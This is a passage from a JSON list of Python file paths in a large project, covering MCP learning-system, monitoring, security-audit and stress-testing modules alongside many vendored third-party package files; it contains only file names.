          "test_env/lib/python3.12/site-packages/coverage/sysmon.py",
          "src/monitoring/memory_monitor.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/__init__.py",
          "test_env/lib/python3.12/site-packages/websockets/uri.py",
          "test_rbac_core.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/engine/create.py",
          "tests/framework/test_automation.py",
          "test_env/lib/python3.12/site-packages/tortoise/models.py",
          "src/utils/database.py",
          "tests/mcp_health_monitoring.py",
          "test_env/lib/python3.12/site-packages/dataclasses_json/undefined.py",
          "rust_core/security_audit_env/mcp_learning_system/python_learning/mcp_learning/core.py",
          "mcp_learning_system/circle_of_experts_validation.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/dml.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/dataclasses.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_adbapi.py",
          "test_env/lib/python3.12/site-packages/pydantic/deprecated/json.py",
          "security_audit_test.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/stats.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/devops/automation/deployment_orchestrator.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "test_env/lib/python3.12/site-packages/httpx/_transports/default.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/protocol.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/foxpro.py",
          "backup_agent3_20250607_010225/src/core/cleanup_scheduler.py",
          "test_environments/load_generators/generators/application_load_generator.py",
          "test_env/lib/python3.12/site-packages/twisted/trial/test/detests.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/covariance/_robust_covariance.py",
          "scripts/pipeline_tools.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/interfaces.py",
          "mcp_performance_validation_suite.py",
          "code-base-crawler/code-base-crawler/test_end_to_end_scenarios.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/_mapping.py",
          "test_env/lib/python3.12/site-packages/urllib3/contrib/emscripten/request.py",
          "mcp_learning_system/stress_testing/scenarios/chaos_recovery.py",
          "backup_agent3_20250607_010225/src/core/circuit_breaker_monitoring.py",
          "test_env/lib/python3.12/site-packages/httpcore/_async/socks_proxy.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/types.py",
          "test_env/lib/python3.12/site-packages/fastapi/routing.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabberxmlstream.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/distance.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/generic.py",
          "src/monitoring/enhanced_memory_metrics.py",
          "test_env/lib/python3.12/site-packages/pydantic/__init__.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "test_environments/automation/result_processor.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/covariance/_shrunk_covariance.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/tests/test_dummy.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/defer.py",
          "test_env/lib/python3.12/site-packages/greenlet/tests/__init__.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/ext/mutable.py",
          "deploy-mcp-production.py",
          "test_env/lib/python3.12/site-packages/alembic/util/langhelpers.py",
          "test_env/lib/python3.12/site-packages/twisted/trial/_dist/worker.py",
          "test_environments/monitoring/collectors/custom_metrics.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_task.py",
          "test_env/lib/python3.12/site-packages/pydantic/fields.py",
          "test_env/lib/python3.12/site-packages/anyio/abc/_resources.py",
          "discover_mcpso_servers.py",
          "test_env/lib/python3.12/site-packages/twisted/trial/test/test_asyncassertions.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/sophia.py",
          "test_environments/chaos_engineering/chaos_orchestrator.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/distro/distro.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/models/link.py",
          "test_env/lib/python3.12/site-packages/anyio/to_process.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/task.py",
          "test_env/lib/python3.12/site-packages/marshmallow/schema.py",
          "test_env/lib/python3.12/site-packages/click/core.py",
          "code-base-crawler/code-base-crawler/tests/generate_workload.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/_mapping.py",
          "test_env/lib/python3.12/site-packages/anyio/streams/file.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/configTools.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/utils/_testing.py",
          "mcp_learning_system/python_learning/mcp_learning/algorithms.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/kdf/__init__.py",
          "deploy_parallel_10_agents.py",
          "test_env/lib/python3.12/site-packages/twisted/application/_client_service.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/groupby/base.py",
          "test_env/lib/python3.12/site-packages/alembic/autogenerate/compare.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/font_manager.py",
          "test_env/lib/python3.12/site-packages/pydantic/_migration.py",
          "test_environments/load_generators/coordination/coordination_engine.py",
          "test_env/lib/python3.12/site-packages/typing_extensions.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pyparsing/diagram/__init__.py",
          "rust_core/security_audit_env/mcp_learning_system/python_learning/mcp_learning/orchestrator.py",
          "test_env/lib/python3.12/site-packages/twisted/test/stdio_test_consumer.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/xmlstream.py",
          "backup_agent3_20250607_010225/src/core/connection_monitoring.py",
          "tests/mcp_stress_testing.py",
          "test_env/lib/python3.12/site-packages/twisted/spread/pb.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/socks.py",
          "test_environments/chaos_engineering/failure_injector.py",
          "test_env/lib/python3.12/site-packages/httpcore/_async/http2.py",
          "tests/memory/test_memory_performance_regression.py",
          "backup_agent3_20250607_010225/src/core/object_pool.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/feature_selection/_base.py",
          "test_env/lib/python3.12/site-packages/twisted/names/test/test_names.py",
          "rust_core/security_audit_env/mcp_learning_system/learning_core/cross_instance.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/int_fiction.py",
          "src/core/memory_monitor.py",
          "src/security/mcp_secure_server.py",
          "test_env/lib/python3.12/site-packages/twisted/test/iosim.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/packaging/specifiers.py",
          "src/mcp/security/auth_integration.py",
          "src/security/vulnerability_management.py",
          "test_env/lib/python3.12/site-packages/_pytest/legacypath.py",
          "test_env/lib/python3.12/site-packages/rich/pretty.py",
          "code-base-crawler/cbc_orchestrator.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/distro/distro.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_connection.py",
          "test_env/lib/python3.12/site-packages/websockets/http11.py",
          "test_environments/automation/pipelines/stress_test_pipeline.py",
          "backup_agent3_20250607_010225/src/mcp/storage/cloud_storage_server.py",
          "mcp_learning_system/servers/bash_god/python_src/safety_learner.py",
          "test_environments/scaling/providers/kubernetes_scaler.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/gaussian_process/kernels.py",
          "test_env/lib/python3.12/site-packages/mako/parsetree.py",
          "test_env/lib/python3.12/site-packages/_pytest/reports.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/python.py",
          "code-base-crawler/code-base-crawler/tensor_mem_ai/tensor_mem_ai/agent.py",
          "mcp_learning_system/learning_core/persistence.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "test_environments/automation/pipelines/chaos_test_pipeline.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/ed448.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_hypotests.py",
          "src/monitoring/health.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/test_bsd.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/ftp.py",
          "test_env/lib/python3.12/site-packages/markdown_it/ruler.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/compiler.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/_windows.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/sql.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_resolver.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/engine/base.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/tests/test_stats.py",
          "test_env/lib/python3.12/site-packages/twisted/words/im/basesupport.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_font_manager.py",
          "test_env/lib/python3.12/site-packages/anyio/__init__.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/endpoints.py",
          "tests/security/security_testing_framework.py",
          "benchmarks/performance_suite.py",
          "test_env/lib/python3.12/site-packages/packaging/_tokenizer.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/configs.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/rich/_windows.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/retry.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/typeguard/_transformer.py",
          "test_cors_security_fixes.py",
          "test_env/lib/python3.12/site-packages/twisted/names/client.py",
          "src/mcp/communication/hub_server.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_xmlrpc.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/client/knownhosts.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/_loss/link.py",
          "mcp_learning_system/final_production_validation.py",
          "src/monitoring/sla.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/operators.py",
          "backup_agent3_20250607_010225/src/core/lru_cache.py",
          "src/auth/mcp_integration.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pygments/style.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/scenarios/chaos_recovery.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/plugin/plugin_base.py",
          "test_env/lib/python3.12/site-packages/tenacity/__init__.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/pretty.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/base/config_generator.py",
          "rust_core/security_audit_env/mcp_learning_system/learning_core/learning_core.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/test/test_tls.py",
          "tests/security/penetration_testing_framework.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/six.py",
          "test_environments/component_integration_blueprint.py",
          "backup_agent3_20250607_010225/src/core/circuit_breaker_config.py",
          "test_env/lib/python3.12/site-packages/zope/interface/interface.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexer.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/bash_god/python_src/context_analyzer.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/__init__.py",
          "test_env/lib/python3.12/site-packages/anyio/streams/memory.py",
          "security_audit_circle_consultation.py",
          "mcp_servers/test_api_integration_stability.py",
          "test_env/lib/python3.12/site-packages/zope/interface/tests/odd.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/traceback.py",
          "test_environments/scaling/strategies/expert_scaling.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/benchmarks/cross_instance_benchmark.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/monitoring/load_generator.py",
          "test_env/lib/python3.12/site-packages/dataclasses_json/utils.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/_windows.py",
          "test_environments/monitoring/alert_manager.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_iutils.py",
          "mcp_learning_system/add_missing_commands.py",
          "test_env/lib/python3.12/site-packages/attr/__init__.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/_sslverify.py",
          "src/core/object_pool.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/_asymmetric.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/pool/base.py",
          "mcp_learning_system/bash_god_mcp_server_backup_20250608_184216.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_page_trend_test.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/scoping.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/cluster/_bicluster.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/tree/_classes.py",
          "simple_api_demo.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/diagram/__init__.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/diagram/__init__.py",
          "test_env/lib/python3.12/site-packages/twisted/web/client.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/semi_supervised/_label_propagation.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/_store_backends.py",
          "test_full_stack.py",
          "test_env/lib/python3.12/site-packages/_pytest/_code/code.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/varLib/instancer/__init__.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/_mapping.py",
          "discover_and_integrate_mcp_servers.py",
          "test_env/lib/python3.12/site-packages/aiosqlite/tests/perf.py",
          "discover_and_integrate_mcp_servers_v2.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_decorators.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/iocpreactor/tcp.py",
          "mcp_learning_system/python_learning/mcp_learning/shared_memory.py",
          "test_environments/monitoring/dashboard_server.py",
          "test_env/lib/python3.12/site-packages/dataclasses_json/mm.py",
          "monitoring/mcp_metrics_collector.py",
          "test_env/lib/python3.12/site-packages/pydantic/networks.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageFile.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/__init__.py",
          "test_env/lib/python3.12/site-packages/_pytest/fixtures.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/hashes.py",
          "mcp_learning_system/servers/bash_god/safety/validator.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/traceback.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/utils/logging.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/python.py",
          "test_env/lib/python3.12/site-packages/anyio/_core/_fileio.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_utils.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/axes/__init__.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexer.py",
          "test_environments/load_generators/load_orchestrator.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_tcp.py",
          "test_env/lib/python3.12/site-packages/automat/_test/test_type_based.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_stdio.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/apply.py",
          "test_env/lib/python3.12/site-packages/structlog/tracebacks.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_decorators_v1.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/__init__.py",
          "test_env/lib/python3.12/site-packages/twisted/names/dns.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/linear_model/_stochastic_gradient.py",
          "test_env/lib/python3.12/site-packages/_pytest/skipping.py",
          "backup_agent3_20250607_010225/src/core/circuit_breaker_metrics.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_flatten.py",
          "src/monitoring/mcp_observability.py",
          "test_env/lib/python3.12/site-packages/_pytest/nodes.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/util/typing.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/ssh/filetransfer.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/rsa.py",
          "test_environments/circle_experts/experts/performance_expert.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/test_mail.py",
          "test_environments/automation/report_generator.py",
          "test_env/lib/python3.12/site-packages/pypika_tortoise/terms.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/business.py",
          "test_mcp_comprehensive.py",
          "mcp_learning_system/servers/devops/automation/auto_scaling.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/_windows.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
          "src/circle_of_experts/rust_integration.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/svgLib/path/parser.py",
          "backup_agent3_20250607_010225/src/mcp/protocols.py",
          "mcp_learning_system/stress_testing/reports/performance_optimization_report.py",
          "test_environments/stress_cycle_controller.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/bash_god/safety/validator.py",
          "test_env/lib/python3.12/site-packages/twisted/names/test/test_client.py",
          "test_env/lib/python3.12/site-packages/twisted/spread/test/test_pbfailure.py",
          "test_env/lib/python3.12/site-packages/pydantic/config.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/_text_helpers.py",
          "mcp_learning_system/learning_core/learning_core.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_sslverify.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_resampling.py",
          "rust_core/security_audit_env/mcp_learning_system/deployment/scripts/production_certification.py",
          "mcp_learning_system/bash_god_mcp_server_backup_20250608_181319.py",
          "test_env/lib/python3.12/site-packages/twisted/names/secondary.py",
          "backup_agent3_20250607_010225/src/core/parallel_executor.py",
          "src/core/lru_cache.py",
          "deploy_mcp_production_fixed.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/recvline.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_udp.py",
          "test_environments/monitoring/collectors/log_metrics.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/config.py",
          "test_env/lib/python3.12/site-packages/asyncio/selectors.py",
          "test_env/lib/python3.12/site-packages/pydantic/mypy.py",
          "src/database/utils.py",
          "src/core/gc_optimization.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_tls.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/quality/python_src/quality_learning.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/postfix.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/_ratio.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/attributes.py",
          "test_env/lib/python3.12/site-packages/markdown_it/token.py",
          "test_env/lib/python3.12/site-packages/rich/_windows.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_wsgi.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/padding.py",
          "test_env/lib/python3.12/site-packages/tortoise/fields/base.py",
          "test_env/lib/python3.12/site-packages/twisted/trial/_asynctest.py",
          "test_env/lib/python3.12/site-packages/_pytest/assertion/util.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/engine/events.py",
          "tests/performance/test_load_scenarios.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/multioutput.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/utils/metaestimators.py",
          "src/mcp/performance_monitor.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/ext/associationproxy.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/typing_extensions.py",
          "validation_regression_test.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_failure.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/integrate/_tanhsinh.py",
          "test_env/lib/python3.12/site-packages/rich/traceback.py",
          "tests/performance/test_memory_usage.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_n_a_m_e.py",
          "src/auth/experts_integration.py",
          "test_env/lib/python3.12/site-packages/dataclasses_json/api.py",
          "test_env/lib/python3.12/site-packages/_pytest/mark/expression.py",
          "mcp_learning_system/stress_testing/monitoring/load_generator.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageFont.py",
          "test_rbac_system.py",
          "tests/memory/test_memory_stress.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/test_pop3client.py",
          "test_environments/load_generators/generators/memory_load_generator.py",
          "test_env/lib/python3.12/site-packages/httpx/_types.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/schema.py",
          "mcp_learning_system/security/input_validator.py",
          "mcp_learning_system/stress_testing/validators/performance_validator.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/semi_supervised/_self_training.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/packaging/specifiers.py",
          "mcp_servers/api_integration_stability_test.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/maildir.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/padding.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/_utils.py",
          "src/auth/middleware.py",
          "test_environments/mcp_integration/resource_pool.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/ext/compiler.py",
          "backup_agent3_20250607_010225/src/core/circuit_breaker.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/events.py",
          "test_env/lib/python3.12/site-packages/twisted/names/srvconnect.py",
          "test_environments/circle_experts/experts/security_expert.py",
          "monitoring/mcp_logging.py",
          "fix_authentication_bypass.py",
          "test_env/lib/python3.12/site-packages/markdown_it/rules_inline/state_inline.py",
          "test_env/lib/python3.12/site-packages/anyio/abc/_eventloop.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_threads.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/_cipheralgorithm.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_filetransfer.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/scripting.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/arrays/arrow/accessors.py",
          "mcp_learning_system/stress_testing/scenarios/cross_instance_stress.py",
          "test_env/lib/python3.12/site-packages/zope/interface/tests/test_advice.py",
          "test_env/lib/python3.12/site-packages/dataclasses_json/__version__.py",
          "mcp_learning_system/stress_testing/integration.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/ensemble/_base.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/devops/python_src/learning.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/rich/table.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_defer.py",
          "src/mcp/storage/cloud_storage_server.py",
          "test_env/lib/python3.12/site-packages/_pytest/main.py",
          "test_environments/scaling/autoscaler.py",
          "test_env/lib/python3.12/site-packages/httpx/_client.py",
          "tests/mcp_testing_framework.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/base/schema_generator.py",
          "test_env/lib/python3.12/site-packages/alembic/runtime/environment.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/amp.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/client/direct.py",
          "test_environments/circle_experts/experts/reliability_expert.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/insults/insults.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/dateutil/tz/tz.py",
          "src/mcp/manager.py",
          "test_env/lib/python3.12/site-packages/six.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/benchmarks/memory_benchmark.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/testing.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/distro/distro.py",
          "src/core/circuit_breaker_config.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/_mapping.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/utils/logging.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/sip.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/ec.py",
          "test_environments/scaling/capacity_planner.py",
          "test_env/lib/python3.12/site-packages/httpx/_models.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/ImageGrab.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/distributions/base.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/wheel/cli/convert.py",
          "test_environments/stress_testing/core/load_controller.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_helper.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/packaging/specifiers.py",
          "test_env/lib/python3.12/site-packages/twisted/words/im/ircsupport.py",
          "mcp_learning_system/deployment/scripts/production_certification.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/validators.py",
          "src/core/circuit_breaker_metrics.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/threads.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/utils/tests/test_tags.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/distributions/base.py",
          "test_env/lib/python3.12/site-packages/urllib3/contrib/emscripten/response.py",
          "test_env/lib/python3.12/site-packages/bs4/tests/test_tree.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/traceback.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/_parallel_backends.py",
          "rust_core/security_audit_env/mcp_learning_system/learning_core/persistence.py",
          "test_env/lib/python3.12/site-packages/cffi/backend_ctypes.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_transport.py",
          "monitoring/security_monitoring.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/suite/test_results.py",
          "test_env/lib/python3.12/site-packages/twisted/web/xmlrpc.py",
          "src/mcp/deployment/orchestrator.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/util/compat.py",
          "tests/framework/test_orchestrator.py",
          "mcp_learning_system/stress_testing/scenarios/learning_under_load.py",
          "test_environments/monitoring/metrics_collector.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/engine/interfaces.py",
          "benchmarks/automation_controller.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/rich/traceback.py",
          "test_env/lib/python3.12/site-packages/alembic/ddl/impl.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/model_selection/_split.py",
          "test_lru_only.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/pretty.py",
          "test_env/lib/python3.12/site-packages/_pytest/tmpdir.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_scilab_builtins.py",
          "test_env/lib/python3.12/site-packages/_pytest/terminal.py",
          "test_env/lib/python3.12/site-packages/zope/interface/common/idatetime.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_forward_ref.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/self_outdated_check.py",
          "test_env/lib/python3.12/site-packages/anyio/_backends/_trio.py",
          "tests/quality_gates/quality_gate_validator.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/neighbors/_base.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/dtypes/common.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/selectable.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/base.py",
          "test_env/lib/python3.12/site-packages/websockets/frames.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_ssh.py",
          "tests/performance/mcp_performance_benchmarks.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/oracle/__init__.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_defgen.py",
          "backup_agent3_20250607_010225/src/mcp/security/auth_middleware.py",
          "test_env/lib/python3.12/site-packages/alembic/testing/fixtures.py",
          "test_env/lib/python3.12/site-packages/twisted/names/test/test_rootresolve.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/theorem.py",
          "rust_core/security_audit_env/mcp_learning_system/learning_core/adaptive_learning.py",
          "test_env/lib/python3.12/site-packages/twisted/names/test/test_server.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/event/base.py",
          "rust_core/security_audit_env/mcp_learning_system/python_learning/mcp_learning/metrics.py",
          "test_env/lib/python3.12/site-packages/coverage/xmlreport.py",
          "benchmarks/optimization_engine.py",
          "code-base-crawler/code-base-crawler/run_security_audit.py",
